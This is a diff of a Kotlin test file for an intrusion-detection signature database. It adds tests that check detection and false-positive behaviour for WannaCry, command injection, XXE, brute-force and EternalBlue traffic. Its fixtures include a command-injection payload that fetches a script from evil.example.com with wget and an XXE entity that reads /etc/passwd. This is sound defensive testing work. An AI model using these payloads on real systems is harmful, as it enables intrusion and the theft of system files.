@@ -66,6 +66,12 @@ class SignatureDatabaseTest {
     }
 
     @Test
+    fun `WannaCry signature matches a kill-switch domain lookup`() {
+        val p = packet(destPort = 53, domain = "www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com")
+        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("MAL-002"))
+    }
+
+    @Test
     fun `WannaCry signature does not match SMB port alone without payload marker`() {
         val payload = "ordinary SMB traffic".toByteArray()
         val p = packet(destPort = 445)
@@ -112,17 +118,33 @@ class SignatureDatabaseTest {
     // ---- EXP-003 RCE Attempt (PayloadContains) -----------------------------
 
     @Test
-    fun `RCE signature matches command injection payload`() {
+    fun `RCE signature matches command injection in an HTTP request`() {
         val payload = "vulnerable_param=x; wget http://evil.example.com/x.sh".toByteArray()
-        assertTrue(SignatureDatabase.matchSignatures(packet(), payload).hasSig("EXP-003"))
+        val p = packet(httpData = mapOf("type" to "request"))
+        assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("EXP-003"))
+    }
+
+    @Test
+    fun `RCE signature ignores script text served by a web server`() {
+        val payload = "function f(){ return eval(x) + system(y) }".toByteArray()
+        val p = packet(sourcePort = 80, httpData = mapOf("type" to "response"))
+        assertFalse(SignatureDatabase.matchSignatures(p, payload).hasSig("EXP-003"))
     }
 
     // ---- EXP-004 XXE (PayloadContains) -------------------------------------
 
     @Test
-    fun `XXE signature matches DOCTYPE ENTITY payload`() {
+    fun `XXE signature matches DOCTYPE ENTITY in an HTTP request`() {
         val payload = "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>".toByteArray()
-        assertTrue(SignatureDatabase.matchSignatures(packet(), payload).hasSig("EXP-004"))
+        val p = packet(httpData = mapOf("type" to "request"))
+        assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("EXP-004"))
+    }
+
+    @Test
+    fun `XXE signature ignores an ordinary HTML page`() {
+        val payload = "<!DOCTYPE html><html><body>hello</body></html>".toByteArray()
+        val p = packet(sourcePort = 80, httpData = mapOf("type" to "response"))
+        assertFalse(SignatureDatabase.matchSignatures(p, payload).hasSig("EXP-004"))
     }
 
     // ---- RECON-001/002/003 Scanner user agents (HeaderPattern) -------------
@@ -195,36 +217,64 @@ class SignatureDatabaseTest {
         assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("C2-003"))
     }
 
+    @Test
+    fun `IRC bot signature needs both the port and the command`() {
+        assertFalse(SignatureDatabase.matchSignatures(packet(destPort = 6667), "hello".toByteArray()).hasSig("C2-003"))
+        assertFalse(SignatureDatabase.matchSignatures(packet(destPort = 443), "PRIVMSG #x :y".toByteArray()).hasSig("C2-003"))
+    }
+
     // ---- EXFIL-001 Base64 Exfiltration (CompositePattern, OR) ---------------
 
     @Test
-    fun `base64 exfiltration signature matches data query parameter`() {
-        val p = packet(httpData = mapOf("url" to "/upload?data=abc123"))
-        val payload = "short body".toByteArray()
-        assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("EXFIL-001"))
-    }
-
-    // ---- BRUTE-001/002 SSH/RDP port signatures ------------------------------
-
-    @Test
-    fun `SSH brute force signature fires for port 22 traffic`() {
-        val p = packet(destPort = 22)
-        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("BRUTE-001"))
+    fun `base64 exfiltration signature matches a long encoded query value`() {
+        val p = packet(httpData = mapOf("uri" to "/upload?data=" + "QUJDREVGR0g".repeat(8)))
+        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("EXFIL-001"))
     }
 
     @Test
-    fun `RDP brute force signature fires for port 3389 traffic`() {
-        val p = packet(destPort = 3389)
-        assertTrue(SignatureDatabase.matchSignatures(p, null).hasSig("BRUTE-002"))
+    fun `base64 exfiltration signature ignores a short data parameter`() {
+        val p = packet(httpData = mapOf("uri" to "/upload?data=abc123"))
+        assertFalse(SignatureDatabase.matchSignatures(p, null).hasSig("EXFIL-001"))
+    }
+
+    // ---- BRUTE-001/002 SSH/RDP tool signatures ------------------------------
+
+    @Test
+    fun `SSH brute force signature fires for a login tool banner`() {
+        val payload = "SSH-2.0-libssh_0.9.6\r\n".toByteArray()
+        assertTrue(SignatureDatabase.matchSignatures(packet(destPort = 22), payload).hasSig("BRUTE-001"))
+    }
+
+    @Test
+    fun `SSH brute force signature does not fire for ordinary SSH traffic`() {
+        val payload = "SSH-2.0-OpenSSH_9.6\r\n".toByteArray()
+        assertFalse(SignatureDatabase.matchSignatures(packet(destPort = 22), payload).hasSig("BRUTE-001"))
+        assertFalse(SignatureDatabase.matchSignatures(packet(destPort = 22), null).hasSig("BRUTE-001"))
+    }
+
+    @Test
+    fun `RDP brute force signature fires for a login tool cookie`() {
+        val payload = "Cookie: mstshash=hydra\r\n".toByteArray()
+        assertTrue(SignatureDatabase.matchSignatures(packet(destPort = 3389), payload).hasSig("BRUTE-002"))
+    }
+
+    @Test
+    fun `RDP brute force signature does not fire for a port alone`() {
+        assertFalse(SignatureDatabase.matchSignatures(packet(destPort = 3389), null).hasSig("BRUTE-002"))
     }
 
     // ---- NET-001 EternalBlue (CompositePattern) -----------------------------
 
     @Test
-    fun `EternalBlue signature matches SMB port with named pipe payload`() {
+    fun `EternalBlue signature matches the exploit echo string on the SMB port`() {
+        val payload = "...JlJmIhClBsr...".toByteArray()
+        assertTrue(SignatureDatabase.matchSignatures(packet(destPort = 445), payload).hasSig("NET-001"))
+    }
+
+    @Test
+    fun `EternalBlue signature does not fire for ordinary SMB named pipe traffic`() {
         val payload = "\\PIPE\\svcctl".toByteArray()
-        val p = packet(destPort = 445)
-        assertTrue(SignatureDatabase.matchSignatures(p, payload).hasSig("NET-001"))
+        assertFalse(SignatureDatabase.matchSignatures(packet(destPort = 445), payload).hasSig("NET-001"))
     }
 
     // ---- NET-002 Shellshock (HeaderPattern) --------------------------------
